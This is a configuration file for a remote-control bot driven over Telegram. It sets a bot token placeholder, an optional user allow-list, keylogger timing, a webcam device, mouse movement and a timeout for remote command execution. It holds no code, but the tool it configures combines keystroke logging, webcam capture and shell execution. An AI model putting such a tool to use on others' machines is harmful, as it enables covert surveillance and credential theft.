# Configuration file for Telegram Remote Control Bot

# === Telegram Bot Settings ===
# Your Telegram Bot Token obtained from @BotFather
# Example: '1234567890:ABCdefGhIJKlmNoPQRsTUVwxyZ'
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'

# === Security Settings ===
# List of allowed Telegram user IDs (integers) that can use the bot
# Empty list means all users are allowed
# Example: [123456789, 987654321]
ALLOWED_USER_IDS = []

# === Keylogger Settings ===
# Duration of inactivity (in seconds) before adding a newline in keylogger output
KEYLOGGER_INACTIVE_DURATION = 3

# Whether the ESC key stops the keylogger
KEYLOGGER_ESC_KEY_STOPS = True

# === Webcam Settings ===
# Default webcam device index (0 is usually the built-in webcam)
WEBCAM_DEVICE_INDEX = 0

# === Mouse Control Settings ===
# Distance in pixels to move the mouse in each direction
MOUSE_MOVE_DISTANCE = 100

# === Command Execution Settings ===
# Timeout for command execution in seconds
COMMAND_TIMEOUT = 30